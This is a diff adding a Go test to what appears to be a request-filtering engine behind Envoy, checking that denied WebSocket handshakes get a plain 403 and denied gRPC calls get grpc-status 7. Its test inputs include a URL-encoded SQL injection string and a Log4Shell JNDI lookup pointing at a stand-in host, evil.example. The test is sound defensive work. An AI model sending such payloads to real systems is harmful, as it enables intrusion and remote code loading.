@@ -161,3 +161,35 @@ func TestWebSocketObservabilityMode(t *testing.T) {
 		})
 	}
 }
+
+// TestWebSocketAndGRPCDenials: on one engine, a denied handshake gets a
+// plain HTTP 403 before the upgrade, and a denied gRPC call grpc-status 7
+// (#276, #275): the upgrade path doesn't change gRPC denials, nor gRPC
+// denials the handshake's.
+func TestWebSocketAndGRPCDenials(t *testing.T) {
+	p := wsPipeline(t, pipeline.ModeBlock, "https://app.example.com")
+	for _, tt := range []struct {
+		name string
+		msg  *extprocv3.ProcessingRequest
+	}{
+		{"forbidden origin", wsHeaders("/chat", "origin", "https://evil.example")},
+		{"attack in the query", wsHeaders("/chat?room=1%27%20OR%20%271%27%3D%271")},
+	} {
+		t.Run(tt.name, func(t *testing.T) {
+			e := newEnvoy(t, p, 64, &bytes.Buffer{})
+			resps := e.exchange(t, tt.msg)
+			ir, set := immediate(t, resps[0])
+			if ir.GetStatus().GetCode() != 403 || ir.GetGrpcStatus() != nil || set["grpc-status"] != "" ||
+				set["content-type"] != "text/plain; charset=utf-8" || string(ir.GetBody()) != "Forbidden\n" {
+				t.Fatalf("handshake denial %v, want a plain 403", ir)
+			}
+		})
+	}
+	e := newEnvoy(t, p, 64, &bytes.Buffer{})
+	resps := e.exchange(t, grpcHeaders("/helloworld.Greeter/SayHello", "x-api-key", "${jndi:ldap://evil.example/a}"),
+		body(grpcMessages("world"), true))
+	ir, set := immediate(t, resps[len(resps)-1])
+	if g := ir.GetGrpcStatus(); g == nil || g.GetStatus() != 7 || set["grpc-status"] != "7" {
+		t.Fatalf("gRPC denial %v, want grpc-status 7", ir)
+	}
+}
